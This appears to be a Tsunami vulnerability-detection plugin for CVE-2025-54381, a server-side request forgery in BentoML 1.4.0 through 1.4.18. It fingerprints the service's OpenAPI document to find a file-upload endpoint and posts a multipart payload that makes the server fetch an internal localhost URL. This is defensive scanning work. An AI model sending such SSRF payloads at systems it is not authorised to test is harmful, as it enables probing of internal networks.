# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "BentoML_CVE_2025_54381"
  author: "dyeddala"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "CVE-2025-54381"
  }
  severity: CRITICAL
  title: "BentoML - Server-Side Request Forgery (SSRF) (CVE-2025-54381)"
  description: "BentoML versions 1.4.0 through 1.4.18 contain a Server-Side Request Forgery (SSRF) vulnerability in the file upload processing system. Unauthenticated remote attackers can force the server to make arbitrary HTTP requests via multipart form data and JSON request handlers that automatically download files from user-provided URLs without internal network validation."
  recommendation: "Upgrade BentoML to version 1.4.19 or later, or restrict access to the BentoML service."
  related_id: {
    publisher: "CVE"
    value: "CVE-2025-54381"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "fingerprint_bentoml"
  http_request: {
    method: GET
    uri: "/docs.json"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "openapi" },
          { body: {} contains: "x-bentoml-name" }
        ]
      }
      extract_all: {
        patterns: [
          {
            from_body: {}
            regexp: "(?s)\"/([a-zA-Z0-9_/-]+)\":\\s*\\{\\s*\"post\":(?:(?!\"/[a-zA-Z0-9_/-]+\":\\s*\\{).)*?\"multipart/form-data\"(?:(?!\"/[a-zA-Z0-9_/-]+\":\\s*\\{).)*?\"format\":\\s*\"binary\""
            variable_name: "endpoint"
          },
          {
            from_body: {}
            regexp: "(?s)\"/{{ endpoint }}\":\\s*\\{\\s*\"post\":(?:(?!\"/[a-zA-Z0-9_/-]+\":\\s*\\{).)*?\"multipart/form-data\"(?:(?!\"/[a-zA-Z0-9_/-]+\":\\s*\\{).)*?\"([a-zA-Z0-9_-]+)\":\\s*\\{[^{}]*\"format\":\\s*\"binary\""
            variable_name: "file_field"
          }
        ]
      }
    }
  }
}

actions: {
  name: "check_bentoml_ssrf"
  http_request: {
    method: POST
    uri: "/{{ endpoint }}"
    headers: [
      { name: "Content-Type" value: "multipart/form-data; boundary=----TsunamiBoundary" }
    ]
    data: "------TsunamiBoundary\r\nContent-Disposition: form-data; name=\"{{ file_field }}\"\r\n\r\nhttp://127.0.0.1:3000/readyz\r\n------TsunamiBoundary--\r\n"
    response: {
      http_status: 200
      extract_any: {
        patterns: [
          {
            from_header: { name: "Server" }
            regexp: "(BentoML)"
            variable_name: "bentoml_server"
          },
          {
            from_header: { name: "x-bentoml-request-id" }
            regexp: "([a-zA-Z0-9-]+)"
            variable_name: "bentoml_server"
          }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  actions: [
    "fingerprint_bentoml",
    "check_bentoml_ssrf"
  ]
}
